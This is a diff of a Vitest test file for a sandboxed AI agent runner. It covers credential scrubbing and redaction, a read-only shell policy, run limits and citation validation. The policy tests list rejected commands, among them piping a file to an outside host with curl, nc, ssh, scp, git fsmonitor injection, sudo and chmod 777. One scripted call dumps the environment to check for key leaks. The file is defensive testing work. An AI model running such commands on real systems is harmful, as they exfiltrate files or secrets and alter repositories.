@@ -1,14 +1,13 @@
-import { existsSync, writeFileSync, readFileSync, readdirSync } from "node:fs";
+import { existsSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
 import { rm } from "node:fs/promises";
 import { isBuiltin } from "node:module";
 import { dirname, join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
-import { buildRunner, makeFixture, makeInput, parseEvents, REPO, RUNNER_DIR, runCli, terminal, toolResults, CLARIFY, call, calls, runScripted, say, finalAnswer } from "./helpers.ts";
 import { fauxAssistantMessage } from "@earendil-works/pi-ai";
+import { buildRunner, CLARIFY, call, finalAnswer, makeFixture, makeInput, parseEvents, REPO, RUNNER_DIR, runCli, runScripted, say, terminal, toolResults } from "./helpers.ts";
 import { apiKeyFor, takeCredentials } from "../src/runner/main.ts";
-import { MAX_TURNS } from "../src/runner/session.ts";
-import { rejectReason, splitCommands } from "../src/runner/tools.ts";
 import { validateSubmission } from "../src/runner/submit.ts";
+import { rejectReason } from "../src/runner/tools.ts";
 
 const SUBMIT = "submit_investigation";
 
@@ -20,151 +19,152 @@ beforeAll(async () => {
 
 afterAll(() => rm(runnerDir, { recursive: true, force: true }));
 
-describe("bundled runner (runner.mjs)", { timeout: 30_000 }, () => {
-  it("--faux investigates the checkout and submits a cited final_answer", () => {
+describe("bundled runner CLI", { timeout: 30_000 }, () => {
+  it("a --faux run uses the real tools on the checkout and ends with exactly one cited final_answer", () => {
     const fx = makeFixture();
     const { code, stdout, stderr } = runCli(["--faux"], JSON.stringify(makeInput(fx)));
     const events = parseEvents(stdout);
 
-    expect(events[0]).toMatchObject({ type: "started", pi_version: "0.83.0", model: "faux" });
-    expect(events[0]?.type === "started" && events[0].prompt_version).toMatch(/^[0-9a-f]{12}$/);
+    expect(events[0]?.type).toBe("started");
     expect(toolResults(events).map((r) => [r.tool, r.is_error])).toEqual([
       ["ls", false],
       ["bash", false],
       ["read", false],
       [SUBMIT, false],
     ]);
-    expect(toolResults(events)[1]?.output_preview).toContain(fx.commit);
-    expect(events.some((e) => e.type === "usage")).toBe(true);
-
-    const end = terminal(events);
-    expect(end.type === "result" && end.result).toMatchObject({
-      status: "final_answer",
-      confidence: "low",
-      evidence: [{ repository: REPO, commit: fx.commit, path: "README.md", start_line: 1, end_line: 12 }],
+    expect(terminal(events)).toMatchObject({
+      type: "result",
+      result: { status: "final_answer", evidence: [{ repository: REPO, commit: fx.commit, path: "README.md" }] },
     });
     expect(code, stderr).toBe(0);
   });
 
-  it("--faux asks for clarification when the latest human message says clarify, then answers the follow-up", () => {
+  it("asks for clarification, then answers once the user replies", () => {
     const fx = makeFixture();
     const first = makeInput(fx, { text: "Please clarify how retries work" });
-    const turn1 = runCli(["--faux"], JSON.stringify(first));
-    const end1 = terminal(parseEvents(turn1.stdout));
-    expect(end1.type === "result" && end1.result.status).toBe("needs_clarification");
-    expect(turn1.code).toBe(0);
+    const end1 = terminal(parseEvents(runCli(["--faux"], JSON.stringify(first)).stdout));
+    expect(end1).toMatchObject({ type: "result", result: { status: "needs_clarification" } });
 
-    const question = end1.type === "result" && end1.result.status === "needs_clarification" ? end1.result.question : "";
     const second = {
       ...first,
       transcript: [
         ...first.transcript,
-        { ts: "1727800001.000100", user_id: null, is_agent: true, text: question },
+        { ts: "1727800001.000100", user_id: null, is_agent: true, text: "Which service type?" },
         { ts: "1727800002.000100", user_id: "U123", is_agent: false, text: "Web services in Oregon." },
       ],
     };
     const end2 = terminal(parseEvents(runCli(["--faux"], JSON.stringify(second)).stdout));
-    expect(end2.type === "result" && end2.result.status).toBe("final_answer");
+    expect(end2).toMatchObject({ type: "result", result: { status: "final_answer" } });
   });
 
-  it("deletes the --key-file and never echoes the key", () => {
+  it("rejects bad arguments and invalid input with invalid_input and exit 2", () => {
     const fx = makeFixture();
-    const keyFile = join(fx.scratchDir, "anthropic.key");
-    const key = "sk-ant-test-cli-0123456789abcdef";
-    writeFileSync(keyFile, `${key}\n`);
-    const { code, stdout, stderr } = runCli(["--faux", "--key-file", keyFile], JSON.stringify(makeInput(fx)));
-    expect(code).toBe(0);
-    expect(existsSync(keyFile)).toBe(false);
-    expect(stdout + stderr).not.toContain(key);
+    const input = makeInput(fx);
+    const cases: Array<[string, string[], string]> = [
+      ["unknown flag", ["--faux", "--bogus"], JSON.stringify(input)],
+      ["stdin is not JSON", ["--faux"], "{nope"],
+      ["missing manifest", ["--faux"], JSON.stringify({ ...input, manifest: undefined })],
+      ["unknown model", ["--faux"], JSON.stringify({ ...input, model: "claude-imaginary-9" })],
+      ["repos_root is not a directory", ["--faux"], JSON.stringify({ ...input, repos_root: join(fx.scratchDir, "missing") })],
+    ];
+    for (const [name, args, stdin] of cases) {
+      const { code, stdout } = runCli(args, stdin);
+      expect(terminal(parseEvents(stdout)), name).toMatchObject({ type: "error", code: "invalid_input" });
+      expect(code, name).toBe(2);
+    }
   });
 
-  it("rejects invalid input with invalid_input and exit 2", () => {
-    const notJson = runCli(["--faux"], "{nope");
-    expect(terminal(parseEvents(notJson.stdout))).toMatchObject({ type: "error", code: "invalid_input" });
-    expect(notJson.code).toBe(2);
-
+  it("fails with agent_error and exit 1 when there is no API key or the model request fails", async () => {
     const fx = makeFixture();
-    const badModel = runCli(["--faux"], JSON.stringify({ ...makeInput(fx), model: "claude-imaginary-9" }));
-    expect(terminal(parseEvents(badModel.stdout))).toMatchObject({ type: "error", code: "invalid_input" });
-    expect(badModel.code).toBe(2);
+    const noKey = runCli([], JSON.stringify(makeInput(fx)));
+    expect(terminal(parseEvents(noKey.stdout))).toMatchObject({ type: "error", code: "agent_error" });
+    expect(noKey.code).toBe(1);
 
-    const missingField = runCli(["--faux"], JSON.stringify({ ...makeInput(fx), manifest: undefined }));
-    expect(terminal(parseEvents(missingField.stdout))).toMatchObject({ type: "error", code: "invalid_input" });
+    const modelError = await runScripted(makeInput(fx), () => [
+      fauxAssistantMessage("", { stopReason: "error", errorMessage: "authentication_error: invalid x-api-key" }),
+    ]);
+    expect(terminal(modelError.events)).toMatchObject({ type: "error", code: "agent_error" });
+    expect(modelError.code).toBe(1);
   });
 
-  it("fails with agent_error when no API key is available outside --faux", () => {
-    const fx = makeFixture();
-    const { code, stdout } = runCli([], JSON.stringify(makeInput(fx)));
-    expect(terminal(parseEvents(stdout))).toMatchObject({ type: "error", code: "agent_error" });
-    expect(code).toBe(1);
-  });
-
-  it("--self-test reports versions without input or network", () => {
+  it("--self-test reports ok with its versions, without input or network", () => {
     const { code, stdout } = runCli(["--self-test"], "");
-    expect(JSON.parse(stdout)).toEqual({
-      ok: true,
-      pi_version: "0.83.0",
-      prompt_version: expect.stringMatching(/^[0-9a-f]{12}$/),
-      node: process.version,
-    });
+    expect(JSON.parse(stdout)).toMatchObject({ ok: true, pi_version: expect.any(String), prompt_version: expect.any(String) });
     expect(code).toBe(0);
-  });
-
-  it("is one self-contained file that imports only Node built-ins", () => {
-    expect(readdirSync(runnerDir)).toEqual(["runner.mjs"]);
-    const code = readFileSync(join(runnerDir, "runner.mjs"), "utf8");
-    const imports = [...code.matchAll(/^import\b[^;]*?\bfrom\s+"([^"]+)"/gm)].map((m) => m[1]);
-    expect(imports.length).toBeGreaterThan(0);
-    expect(imports.filter((spec) => !isBuiltin(spec!))).toEqual([]);
   });
 });
 
-// Tests that inspect a command's environment have it write to a file: Pi stops reading a command's stdout
-// 100 ms after the process exits, so under load the tool result can come back empty.
 describe("credentials", { timeout: 30_000 }, () => {
-  it("deletes the key file before the session starts and keeps secrets out of the bash env", async () => {
+  it("takeCredentials deletes the key file and removes every provider's key vars from the env", () => {
     const fx = makeFixture();
-    const keyFile = join(fx.scratchDir, "..", "anthropic.key");
-    const fileKey = "sk-ant-test-FILEKEY-0123456789";
-    writeFileSync(keyFile, `${fileKey}\n`);
-    process.env.ANTHROPIC_API_KEY = "sk-ant-test-ENVKEY-9876543210";
-    process.env.ANTHROPIC_OAUTH_TOKEN = "oauth-token-value";
-    process.env.RENDER_API_KEY = "rnd-not-for-the-model";
+    const keyFile = join(fx.scratchDir, "model.key");
+    writeFileSync(keyFile, "sk-file-key\n");
+    const env: NodeJS.ProcessEnv = { ANTHROPIC_API_KEY: "sk-ant", ANTHROPIC_OAUTH_TOKEN: "oauth", OPENAI_API_KEY: "sk-openai", PATH: "/bin" };
 
-    const { code, stdout, events } = await runScripted(
+    const fromFile = takeCredentials(keyFile, env);
+    expect(existsSync(keyFile)).toBe(false);
+    expect(env).toEqual({ PATH: "/bin" });
+    expect(apiKeyFor(fromFile, "openai")).toBe("sk-file-key");
+
+    const fromEnv = takeCredentials(undefined, { ANTHROPIC_API_KEY: " sk-ant ", OPENAI_API_KEY: "sk-openai" });
+    expect(apiKeyFor(fromEnv, "anthropic")).toBe("sk-ant");
+    expect(apiKeyFor(fromEnv, "google")).toBeUndefined();
+  });
+
+  // The shell writes its observations to a file: Pi stops reading stdout 100 ms after exit, so a busy run can lose it.
+  it("the bash tool rejects policy violations and runs other commands with an allowlisted env and no credentials in reach", async () => {
+    const fx = makeFixture();
+    const keyFile = join(fx.scratchDir, "..", "model.key");
+    writeFileSync(keyFile, "sk-ant-test-FILEKEY-0123456789\n");
+    process.env.ANTHROPIC_API_KEY = "sk-ant-test-ENVKEY-9876543210";
+    process.env.RENDER_API_KEY = "rnd-not-for-the-model";
+    try {
+      const { code, events } = await runScripted(
+        makeInput(fx),
+        () => [
+          call("bash", { command: "git checkout -b evil" }),
+          call("bash", { command: `(test -e ${keyFile} && echo KEY_FILE_PRESENT || echo KEY_FILE_ABSENT; env) > $HOME/env.txt` }),
+          call(SUBMIT, CLARIFY),
+        ],
+        ["--key-file", keyFile],
+      );
+
+      expect(toolResults(events).map((r) => r.is_error)).toEqual([true, false, false]);
+      const env = readFileSync(join(fx.scratchDir, "env.txt"), "utf8");
+      expect(env).toContain("KEY_FILE_ABSENT");
+      expect(env).toContain(`HOME=${fx.scratchDir}`);
+      for (const leaked of ["sk-ant", "ANTHROPIC", "RENDER_API_KEY"]) expect(env).not.toContain(leaked);
+      expect(process.env.ANTHROPIC_API_KEY).toBeUndefined();
+      expect(code).toBe(0);
+    } finally {
+      delete process.env.RENDER_API_KEY;
+    }
+  });
+
+  it("redacts the file and env API keys from every emitted event", async () => {
+    const fx = makeFixture();
+    const keyFile = join(fx.scratchDir, "..", "model.key");
+    const fileKey = "sk-ant-test-FILEKEY-0123456789";
+    const envKey = "sk-openai-test-ENVKEY-9876543210";
+    writeFileSync(keyFile, `${fileKey}\n`);
+    process.env.OPENAI_API_KEY = envKey;
+
+    const { stdout, events } = await runScripted(
       makeInput(fx),
-      () => [
-        call("bash", { command: `(test -e ${keyFile} && echo KEY_FILE_PRESENT || echo KEY_FILE_ABSENT; env) > $HOME/env.txt` }),
-        call(SUBMIT, CLARIFY),
-      ],
+      () => [call("bash", { command: `echo ${fileKey} ${envKey}` }), call(SUBMIT, { ...CLARIFY, question: `Is ${fileKey} yours?` })],
       ["--key-file", keyFile],
     );
 
     expect(toolResults(events)[0]?.is_error).toBe(false);
-    const env = readFileSync(join(fx.scratchDir, "env.txt"), "utf8");
-    expect(env).toContain("KEY_FILE_ABSENT");
-    expect(env).toContain(`HOME=${fx.scratchDir}`);
-    for (const leaked of ["sk-ant", "ANTHROPIC", "oauth-token-value", "RENDER_API_KEY"]) expect(env).not.toContain(leaked);
+    expect(terminal(events).type).toBe("result");
     expect(stdout).not.toContain(fileKey);
-    expect(existsSync(keyFile)).toBe(false);
-    expect(process.env.ANTHROPIC_API_KEY).toBeUndefined();
-    expect(process.env.ANTHROPIC_OAUTH_TOKEN).toBeUndefined();
-    expect(code).toBe(0);
-    delete process.env.RENDER_API_KEY;
-  });
-
-  it("falls back to the selected provider's own key var and removes every provider's vars from the env", () => {
-    const env: NodeJS.ProcessEnv = { ANTHROPIC_API_KEY: " sk-ant-env ", ANTHROPIC_AUTH_TOKEN: "bearer", OPENAI_API_KEY: "sk-openai", PATH: "/bin" };
-    const creds = takeCredentials(undefined, env);
-    expect(env).toEqual({ PATH: "/bin" });
-    expect(apiKeyFor(creds, "anthropic")).toBe("sk-ant-env");
-    expect(apiKeyFor(creds, "openai")).toBe("sk-openai");
-    expect(apiKeyFor(creds, "google")).toBeUndefined();
+    expect(stdout).not.toContain(envKey);
+    expect(stdout).toContain("[REDACTED]");
   });
 });
 
-describe("run limits", { timeout: 30_000 }, () => {
-  it("aborts at the deadline (timeout_ms minus the safety margin) with exit 3", async () => {
+describe("run outcomes", { timeout: 30_000 }, () => {
+  it("stops at the deadline with a timeout error and exit 3, without waiting for running commands", async () => {
     const fx = makeFixture();
     const startedAt = Date.now();
     const { code, events } = await runScripted(makeInput(fx, { timeout_ms: 12_000 }), () =>
@@ -173,364 +173,147 @@ describe("run limits", { timeout: 30_000 }, () => {
     expect(terminal(events)).toMatchObject({ type: "error", code: "timeout" });
     expect(code).toBe(3);
     expect(Date.now() - startedAt).toBeLessThan(5_000);
-    expect(toolResults(events)[0]).toMatchObject({ tool: "bash", is_error: true, output_preview: expect.stringContaining("aborted") });
   });
 
-  it("ends on a submission batched with another call, without another LLM request", async () => {
+  it("reminds a model that stops without submitting once, then fails with no_submission", async () => {
     const fx = makeFixture();
-    let extraCalls = 0;
-    const { code, events } = await runScripted(makeInput(fx), () => [
-      calls(["ls", {}], [SUBMIT, CLARIFY]),
-      () => (extraCalls++, say("NEVER")),
-    ]);
-    expect(toolResults(events).map((r) => [r.tool, r.is_error])).toEqual([
-      ["ls", false],
-      [SUBMIT, false],
-    ]);
-    expect(terminal(events)).toMatchObject({ type: "result", result: CLARIFY });
-    expect(extraCalls).toBe(0);
-    expect(code).toBe(0);
-  });
-
-  it("reminds the model once when it stops without submitting", async () => {
-    const fx = makeFixture();
-    const answered = await runScripted(makeInput(fx), () => [say("Here is my answer in prose."), call(SUBMIT, CLARIFY)]);
-    expect(terminal(answered.events)).toMatchObject({ type: "result" });
-    expect(answered.events.filter((e) => e.type === "assistant_text").map((e) => e.type === "assistant_text" && e.text)).toEqual([
-      "Here is my answer in prose.",
-    ]);
+    const recovered = await runScripted(makeInput(fx), () => [say("Here is my answer in prose."), call(SUBMIT, CLARIFY)]);
+    expect(terminal(recovered.events)).toMatchObject({ type: "result", result: CLARIFY });
+    expect(recovered.code).toBe(0);
 
     const silent = await runScripted(makeInput(fx), () => [say("prose"), say("more prose")]);
     expect(terminal(silent.events)).toMatchObject({ type: "error", code: "no_submission" });
     expect(silent.code).toBe(1);
   });
 
-  it(`stops after ${MAX_TURNS} turns`, async () => {
+  it("lets the model fix a rejected submission, and fails with invalid_submission after three rejections", async () => {
     const fx = makeFixture();
-    const { code, events } = await runScripted(makeInput(fx), () => [
-      ...Array.from({ length: MAX_TURNS }, () => call("ls", {})),
-      call(SUBMIT, CLARIFY),
-    ]);
-    expect(terminal(events)).toMatchObject({ type: "error", code: "no_submission", message: expect.stringContaining("turn limit") });
-    expect(toolResults(events)).toHaveLength(MAX_TURNS);
-    expect(code).toBe(1);
-  });
+    const bad = finalAnswer([{ repository: REPO, commit: fx.commit, path: "missing.ts", start_line: 1, end_line: 1 }]);
+    const good = finalAnswer([{ repository: REPO, commit: fx.commit, path: "src/retry.ts", start_line: 1, end_line: 2 }]);
 
-  it("maps a model error to agent_error", async () => {
-    const fx = makeFixture();
-    const { code, events } = await runScripted(makeInput(fx), () => [
-      fauxAssistantMessage("", { stopReason: "error", errorMessage: "authentication_error: invalid x-api-key" }),
-    ]);
-    expect(terminal(events)).toMatchObject({ type: "error", code: "agent_error", message: expect.stringContaining("invalid x-api-key") });
-    expect(code).toBe(1);
-  });
+    const fixed = await runScripted(makeInput(fx), () => [call(SUBMIT, bad), call(SUBMIT, good)]);
+    expect(toolResults(fixed.events).map((r) => r.is_error)).toEqual([true, false]);
+    expect(terminal(fixed.events)).toMatchObject({ type: "result", result: { status: "final_answer" } });
+    expect(fixed.code).toBe(0);
 
-  it("retries a transient model error and carries on from the same turn", async () => {
-    const fx = makeFixture();
-    const overloaded = () => fauxAssistantMessage("", { stopReason: "error", errorMessage: "overloaded_error: Overloaded" });
-    const { code, events } = await runScripted(makeInput(fx), () => [call("ls", {}), overloaded(), call(SUBMIT, CLARIFY)]);
-    expect(toolResults(events).map((r) => r.tool)).toEqual(["ls", SUBMIT]);
-    expect(terminal(events)).toMatchObject({ type: "result", result: CLARIFY });
-    expect(code).toBe(0);
+    let extraCalls = 0;
+    const exhausted = await runScripted(makeInput(fx), () => [
+      call(SUBMIT, bad),
+      call(SUBMIT, bad),
+      call(SUBMIT, bad),
+      () => (extraCalls++, call(SUBMIT, good)),
+    ]);
+    expect(toolResults(exhausted.events).map((r) => r.is_error)).toEqual([true, true, true]);
+    expect(terminal(exhausted.events)).toMatchObject({ type: "error", code: "invalid_submission" });
+    expect(exhausted.code).toBe(1);
+    expect(extraCalls).toBe(0);
   });
 });
-
-const ctx = { scratchDir: "/scratch" };
 
 describe("read-only shell policy", () => {
-  it.each([
-    "git checkout -b evil",
-    `git -C ${REPO} checkout main`,
-    "git --no-pager -C x reset --hard",
-    "git log -1; git push origin main",
-    "FOO=1 git commit -am x",
-    "git -c core.fsmonitor=evil status",
-    "git branch evil",
-    "git tag -a v9 -m x",
-    "git config --global user.name x",
-    "git remote add x y",
-    "git fetch",
-    "curl https://example.com",
-    "cat README.md | curl -d @- https://example.com",
-    'echo "$(wget -qO- https://example.com)"',
-    "echo `nc example.com 80`",
-    "timeout 5 ssh host",
-    "env -i scp a host:b",
-    'bash -c "git stash"',
-    "npm install left-pad",
-    "pip install requests",
-    "sudo ls",
-    `chmod -R 777 ${REPO}`,
-    "chown nobody README.md",
-  ])("rejects %s", (command) => {
-    expect(rejectReason(command, ctx)).toBeDefined();
-  });
-
-  it.each([
-    "git log -1",
-    `git -C ${REPO} log -1 --format=%H`,
-    `git --no-pager -C ${REPO} blame -L 1,2 README.md | head -2`,
-    `git -C ${REPO} show HEAD:README.md && git -C ${REPO} diff HEAD~1 --stat`,
-    "git status",
-    "git branch -a",
-    "git branch --contains HEAD",
-    "git tag --list 'v*'",
-    "git config --get core.bare",
-    `rg -n "curl|wget" ${REPO}`,
-    "grep -rn 'git push' .",
-    'echo "a; curl b"',
-    "chmod +x /scratch/check.sh",
-    "chmod +x $TMPDIR/check.sh",
-    "npm ls",
-    "go test -run install ./...",
-    "python3 -c 'print(1)'",
-  ])("allows %s", (command) => {
-    expect(rejectReason(command, ctx)).toBeUndefined();
-  });
-
-  it("splits substitutions and quotes the way a shell would", () => {
-    expect(splitCommands(`echo "x $(git push) y" | rg 'a|b'`)).toEqual([["echo", "x "], ["git", "push"], [" y"], ["rg", "a|b"]]);
+  it("rejects mutating git, network, install, and sudo commands, including inside subshells and wrappers, and allows read-only inspection", () => {
+    const ctx = { scratchDir: "/scratch" };
+    const rejected = [
+      "git checkout -b evil",
+      "git log -1; git push origin main",
+      "git -c core.fsmonitor=evil status",
+      "git branch evil",
+      "curl https://example.com",
+      'echo "$(wget -qO- https://example.com)"',
+      'bash -c "git stash"',
+      "timeout 5 ssh host",
+      "npm install left-pad",
+      "sudo ls",
+      `chmod -R 777 ${REPO}`,
+    ];
+    const allowed = [
+      `git -C ${REPO} log -1 --format=%H`,
+      `git -C ${REPO} blame -L 1,2 README.md | head -2`,
+      "git branch --contains HEAD",
+      `rg -n "curl|wget" ${REPO}`,
+      'echo "a; curl b"',
+      "chmod +x /scratch/check.sh",
+      "npm ls",
+    ];
+    expect(rejected.filter((command) => rejectReason(command, ctx) === undefined)).toEqual([]);
+    expect(allowed.filter((command) => rejectReason(command, ctx) !== undefined)).toEqual([]);
   });
 });
 
-describe("bash tool", { timeout: 30_000 }, () => {
-  it("returns policy rejections to the model and runs read-only git", async () => {
-    const fx = makeFixture();
-    const { code, events } = await runScripted(makeInput(fx), () => [
-      call("bash", { command: "git checkout -b evil" }),
-      call("bash", { command: "curl -s https://example.com" }),
-      call("bash", { command: `git -C ${REPO} log -1 --format=%H` }),
-      call(SUBMIT, CLARIFY),
-    ]);
-    const [checkout, curl, log] = toolResults(events);
-    expect(checkout).toMatchObject({ is_error: true, output_preview: expect.stringContaining("git checkout is not allowed") });
-    expect(curl).toMatchObject({ is_error: true, output_preview: expect.stringContaining("curl is not allowed") });
-    expect(log).toMatchObject({ is_error: false });
-    expect(log?.output_preview.trim()).toBe(fx.commit);
-    expect(terminal(events).type).toBe("result");
-    expect(code).toBe(0);
-  });
-
-  it("searches through bash, and runs it with only the allowlisted env", async () => {
-    const fx = makeFixture();
-    process.env.RENDER_API_KEY = "rnd-not-for-the-model";
-    try {
-      const { events } = await runScripted(makeInput(fx), () => [
-        call("bash", { command: `git -C ${REPO} grep -n MAX_DELAY_MS -- src` }),
-        call("bash", { command: "env > $HOME/env.txt" }),
-        call(SUBMIT, CLARIFY),
-      ]);
-      const [grep, envCall] = toolResults(events);
-      expect(grep).toMatchObject({ is_error: false, output_preview: expect.stringContaining("src/retry.ts:1:") });
-      expect(envCall?.is_error).toBe(false);
-      const env = readFileSync(join(fx.scratchDir, "env.txt"), "utf8");
-      expect(env).toContain(`HOME=${fx.scratchDir}`);
-      expect(env).not.toContain("RENDER_API_KEY");
-    } finally {
-      delete process.env.RENDER_API_KEY;
-    }
-  });
-});
-
-describe("ls and read tools", { timeout: 30_000 }, () => {
-  it("lists directories with a trailing slash, relative to the repos root", async () => {
-    const fx = makeFixture();
-    const { events } = await runScripted(makeInput(fx), () => [call("ls", { path: REPO }), call(SUBMIT, CLARIFY)]);
-    const [ls] = toolResults(events);
-    expect(ls).toMatchObject({ is_error: false });
-    expect(ls?.output_preview.split("\n")).toEqual([".git/", "escape.txt", "README.md", "src/"]);
-  });
-
-  it("reads line ranges and leaves images out of the model's context", async () => {
-    const fx = makeFixture();
-    const png = Buffer.from("89504e470d0a1a0a0000000d4948445200000001000000010806000000", "hex");
-    writeFileSync(join(fx.scratchDir, "pixel.png"), png);
-    const { events } = await runScripted(makeInput(fx), () => [
-      call("read", { path: `${REPO}/README.md`, offset: 2, limit: 2 }),
-      call("read", { path: join(fx.scratchDir, "pixel.png") }),
-      call(SUBMIT, CLARIFY),
-    ]);
-    const [text, image] = toolResults(events);
-    expect(text?.output_preview).toContain("readme line 2\nreadme line 3");
-    expect(text?.output_preview).not.toContain("readme line 4");
-    expect(image?.output_preview).toContain("[image omitted]");
-    expect(image?.output_preview).not.toContain("[image]");
-  });
-});
-
-describe("validateSubmission", () => {
+describe("citation validation", () => {
   const fx = makeFixture();
   const checkouts = { manifest: makeInput(fx).manifest, repos_root: fx.reposRoot };
   const cite = (over: Record<string, unknown>) => finalAnswer([{ repository: REPO, commit: fx.commit, path: "README.md", start_line: 1, end_line: 3, ...over }]);
-  const problems = (candidate: unknown) => {
-    const v = validateSubmission(candidate, checkouts);
-    return v.ok ? [] : v.problems;
-  };
 
-  it("accepts a clarification and a valid citation, normalizing commit prefixes and ./ paths", () => {
+  it("accepts clarifications and valid citations, pinning them to the full manifest commit and a clean path", () => {
     expect(validateSubmission(CLARIFY, checkouts).ok).toBe(true);
-    const v = validateSubmission(cite({ commit: fx.commit.slice(0, 7), path: "./src/retry.ts", end_line: 2 }), checkouts);
-    expect(v.ok && v.result.status === "final_answer" && v.result.evidence[0]).toEqual({
-      repository: REPO,
-      commit: fx.commit,
-      path: "src/retry.ts",
-      start_line: 1,
-      end_line: 2,
-    });
-  });
+    expect(validateSubmission(finalAnswer([], []), checkouts).ok).toBe(true);
 
-  it("reports schema problems field by field", () => {
-    expect(problems({ status: "final_answer", answer: "x" }).join("\n")).toMatch(/confidence/);
-    expect(problems({ status: "needs_clarification" }).join("\n")).toMatch(/question[\s\S]*why_needed/);
-  });
-
-  it("rejects citations that do not match the manifest or the checkout", () => {
-    expect(problems(cite({ repository: "acme/other" }))).toEqual([expect.stringMatching(/not in the manifest \(acme\/widget\)/)]);
-    expect(problems(cite({ commit: "deadbeef" }))).toEqual([expect.stringContaining(`not the manifest commit for ${REPO} (${fx.commit})`)]);
-    expect(problems(cite({ path: "../../outside.txt" }))).toEqual([expect.stringContaining('must not contain ".."')]);
-    expect(problems(cite({ path: "escape.txt" }))).toEqual([expect.stringContaining("resolves outside acme/widget")]);
-    expect(problems(cite({ path: `${fx.repoDir}/README.md` }))).toEqual([expect.stringContaining('did you mean "README.md"')]);
-    expect(problems(cite({ path: `${REPO}/README.md` }))).toEqual([expect.stringContaining('try "README.md"')]);
-    expect(problems(cite({ path: "src" }))).toEqual([expect.stringContaining("not a regular file")]);
-    expect(problems(cite({ path: ".git/HEAD" }))).toEqual([expect.stringContaining("inside .git")]);
-    expect(problems(cite({ end_line: 13 }))).toEqual([expect.stringContaining("past the end of acme/widget/README.md (12 lines)")]);
-    expect(problems(cite({ start_line: 5, end_line: 4 }))).toEqual([expect.stringContaining("start_line 5 is after end_line 4")]);
-  });
-
-  it("requires evidence when observed_in_code has claims", () => {
-    expect(problems(finalAnswer([]))).toEqual([expect.stringContaining("observed_in_code has 1 claim(s) but evidence is empty")]);
-    expect(problems(finalAnswer([], []))).toEqual([]);
-  });
-
-  it("drops a model-supplied url from the returned evidence", () => {
-    const candidate = finalAnswer([
-      { repository: REPO, commit: fx.commit, path: "README.md", start_line: 1, end_line: 3, url: "https://evil.example.com" },
+    const v = validateSubmission(cite({ commit: fx.commit.slice(0, 7), path: "./src/retry.ts", end_line: 2, url: "https://evil.example.com" }), checkouts);
+    expect(v.ok && v.result.status === "final_answer" && v.result.evidence).toEqual([
+      { repository: REPO, commit: fx.commit, path: "src/retry.ts", start_line: 1, end_line: 2 },
     ]);
-    const v = validateSubmission(candidate, checkouts);
-    expect(v.ok).toBe(true);
-    if (v.ok && v.result.status === "final_answer") {
-      expect(v.result.evidence[0]).not.toHaveProperty("url");
+  });
+
+  it("rejects citations outside the manifest, the manifest commit, the checkout's files, or the file's lines, and observed claims without evidence", () => {
+    const cases: Array<[string, unknown, string]> = [
+      ["repository not in the manifest", cite({ repository: "acme/other" }), "evidence[0].repository"],
+      ["commit other than the manifest commit", cite({ commit: "deadbeef" }), "evidence[0].commit"],
+      ["absolute path", cite({ path: `${fx.repoDir}/README.md` }), "evidence[0].path"],
+      ["path with ..", cite({ path: "../../outside.txt" }), "evidence[0].path"],
+      ["symlink escaping the repo", cite({ path: "escape.txt" }), "evidence[0].path"],
+      ["file inside .git", cite({ path: ".git/HEAD" }), "evidence[0].path"],
+      ["directory", cite({ path: "src" }), "evidence[0].path"],
+      ["missing file", cite({ path: "missing.ts" }), "evidence[0].path"],
+      ["range past the end of the file", cite({ end_line: 13 }), "evidence[0].end_line"],
+      ["start after end", cite({ start_line: 5, end_line: 4 }), "evidence[0]"],
+      ["observed claims without evidence", finalAnswer([]), "evidence"],
+    ];
+    for (const [name, candidate, field] of cases) {
+      const v = validateSubmission(candidate, checkouts);
+      expect(v.ok ? [] : v.problems.map((p) => p.slice(0, p.indexOf(":"))), name).toEqual([field]);
     }
   });
 });
 
-describe("submit_investigation in a run", { timeout: 30_000 }, () => {
-  it("returns every problem to the model, and accepts the corrected submission", async () => {
-    const fx = makeFixture();
-    const bad = finalAnswer([
-      { repository: REPO, commit: "deadbeef", path: "src/retry.ts", start_line: 1, end_line: 2 },
-      { repository: REPO, commit: fx.commit, path: "../../outside.txt", start_line: 1, end_line: 1 },
-      { repository: REPO, commit: fx.commit, path: "README.md", start_line: 10, end_line: 99 },
-    ]);
-    const good = finalAnswer([{ repository: REPO, commit: fx.commit.slice(0, 10), path: "src/retry.ts", start_line: 1, end_line: 2 }]);
-    let extraCalls = 0;
-    const { code, events } = await runScripted(makeInput(fx), () => [
-      call(SUBMIT, bad),
-      call(SUBMIT, finalAnswer([])),
-      call(SUBMIT, good),
-      () => (extraCalls++, say("NEVER")),
-    ]);
-
-    const [first, second, third] = toolResults(events);
-    expect(first).toMatchObject({ tool: SUBMIT, is_error: true });
-    expect(first?.output_preview).toContain("attempt 1 of 3");
-    expect(first?.output_preview).toContain("evidence[0].commit");
-    expect(first?.output_preview).toContain("evidence[1].path");
-    expect(first?.output_preview).toContain("evidence[2].end_line");
-    expect(second).toMatchObject({ is_error: true, output_preview: expect.stringContaining("evidence is empty") });
-    expect(third).toMatchObject({ is_error: false });
-
-    const end = terminal(events);
-    expect(end.type === "result" && end.result).toMatchObject({
-      status: "final_answer",
-      evidence: [{ repository: REPO, commit: fx.commit, path: "src/retry.ts", start_line: 1, end_line: 2 }],
-    });
-    expect(code).toBe(0);
-    expect(extraCalls).toBe(0);
-  });
-
-  it("gives up with invalid_submission after three rejected submissions", async () => {
-    const fx = makeFixture();
-    const bad = finalAnswer([{ repository: REPO, commit: fx.commit, path: "missing.ts", start_line: 1, end_line: 1 }]);
-    let extraCalls = 0;
-    const { code, events } = await runScripted(makeInput(fx), () => [
-      call(SUBMIT, bad),
-      call(SUBMIT, bad),
-      call(SUBMIT, bad),
-      () => (extraCalls++, call(SUBMIT, CLARIFY)),
-    ]);
-    expect(toolResults(events).every((r) => r.is_error)).toBe(true);
-    expect(toolResults(events).at(-1)?.output_preview).toContain("No attempts remain");
-    expect(terminal(events)).toMatchObject({ type: "error", code: "invalid_submission" });
-    expect(code).toBe(1);
-    expect(extraCalls).toBe(0);
-  });
-});
-
-/** The only packages the runner may use; everything it imports ends up in the sandbox bundle. */
-const RUNNER_PACKAGES = new Set([
-  "@earendil-works/pi-agent-core",
-  "@earendil-works/pi-ai",
-  "typebox",
-  "zod",
-]);
-
-/** Modules in src/ shared by the runner and the host; they may import only zod and each other. */
+const RUNNER_PACKAGES = new Set(["@earendil-works/pi-agent-core", "@earendil-works/pi-ai", "typebox", "zod"]);
 const SHARED_MODULES = new Set(["investigation.ts", "manifest.ts", "util.ts"]);
